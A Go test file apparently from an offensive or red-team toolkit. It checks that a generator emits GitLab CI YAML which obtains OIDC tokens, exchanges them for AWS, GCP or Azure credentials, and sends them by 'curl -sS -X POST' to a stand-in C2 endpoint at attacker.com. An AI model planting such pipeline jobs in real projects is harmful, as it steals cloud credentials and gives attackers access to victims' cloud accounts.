package payloads

import (
	"strings"
	"testing"
)

func TestGenerateOIDCFederationYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     OIDCFederationOptions
		contains []string
		absent   []string
	}{
		{
			name: "AWS default",
			opts: OIDCFederationOptions{},
			contains: []string{
				"id_tokens:",
				"OIDC_TOKEN:",
				"aud: sts.amazonaws.com",
				"_OIDC_EXFIL()",
				"AssumeRoleWithWebIdentity",
				"aws_credentials.json",
				"_OIDC_EXFIL || true",
				"allow_failure: true",
			},
			absent: []string{
				"googleapis",
				"microsoftonline",
				"curl -sS -X POST -F",
			},
		},
		{
			name: "GCP provider",
			opts: OIDCFederationOptions{
				Provider: "gcp",
				RoleARN:  "projects/123/locations/global/workloadIdentityPools/pool/providers/gitlab",
			},
			contains: []string{
				"aud: https://iam.googleapis.com",
				"sts.googleapis.com/v1/token",
				"gcp_sts_token.json",
				"projects/123/locations/global/workloadIdentityPools/pool/providers/gitlab",
			},
			absent: []string{
				"AssumeRoleWithWebIdentity",
				"microsoftonline",
			},
		},
		{
			name: "Azure provider",
			opts: OIDCFederationOptions{
				Provider: "azure",
				RoleARN:  "my-tenant-id",
			},
			contains: []string{
				"aud: api://AzureADTokenExchange",
				"login.microsoftonline.com/my-tenant-id",
				"azure_token.json",
				"jwt-bearer",
			},
			absent: []string{
				"AssumeRoleWithWebIdentity",
				"googleapis",
			},
		},
		{
			name: "custom audience and token name",
			opts: OIDCFederationOptions{
				Provider:  "aws",
				Audience:  "custom-audience",
				TokenName: "MY_JWT",
			},
			contains: []string{
				"MY_JWT:",
				"aud: custom-audience",
				"$MY_JWT",
			},
		},
		{
			name: "with callback URL",
			opts: OIDCFederationOptions{
				Provider:    "aws",
				CallbackURL: "https://attacker.com/c2",
			},
			contains: []string{
				"curl -sS -X POST -F",
				"https://attacker.com/c2/exfil",
				`provider=aws`,
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			y := GenerateOIDCFederationYAML(tc.opts)
			for _, s := range tc.contains {
				if !strings.Contains(y, s) {
					t.Errorf("expected %q in output:\n%s", s, y)
				}
			}
			for _, s := range tc.absent {
				if strings.Contains(y, s) {
					t.Errorf("unexpected %q in output:\n%s", s, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
